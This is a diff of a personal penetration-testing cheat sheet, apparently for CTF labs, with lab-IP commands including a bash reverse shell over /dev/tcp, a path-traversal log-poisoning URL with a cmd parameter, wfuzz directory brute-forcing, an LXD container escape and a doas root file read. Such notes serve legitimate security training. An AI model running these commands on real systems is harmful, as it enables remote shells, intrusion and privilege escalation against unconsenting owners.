@@ -60,7 +60,6 @@ bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
 ```linux
 chmod 600 id_rsa
 ```
-
 #### broken png image
 ```
 xxd thm.jpg | head
@@ -72,7 +71,7 @@ mkdir tmp/
 sudo mount -t nfs 10.10.104.64: tmp
 tree tmp
 ```
-
+#### cadaver for WebDAV
 ---
 #### File Transfer on `Netcat`
 
@@ -90,21 +89,6 @@ scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 ```
 ---
 ### Web
-#### fuzz with python script
-```python
-#!/usr/bin/env python3
-
-import requests
-
-host = '10.10.109.114'
-url = 'http://{}/page/?secret={}'
-
-for i in range(100):
-    r = requests.get(url.format(host, i))
-    if not 'That is wrong!' in r.text:
-        print("Found secret: {}".format(i))
-        print(r.text)
-```
 #### Discover hidden directories:
 ```linux
 wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
@@ -146,7 +130,8 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 
 ---
 ### Privilege Escalation:
-#### LXD container exploitation:
+<details><summary> LXD container exploitation </summary> 
+
 ```
 wget archive
 lxc image import ./archive --alias myimage
@@ -156,6 +141,15 @@ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=tru
 lxc start ignite
 lxc exec ignite /bin/sh
 ```
+</details>
+<details><summary> read file with doas </summary>
+
+```
+doas -u root openssl enc -in file
+```
+
+</details>
+
 #### information gathering
 ```
 cat /proc/version
@@ -247,6 +241,12 @@ regedit
 ```
 </details>
 <details> <summary> SMB discovery </summary>
+
+enumerate
+
+```
+enum4linux -h
+```
 open SMB shares
 
 ```
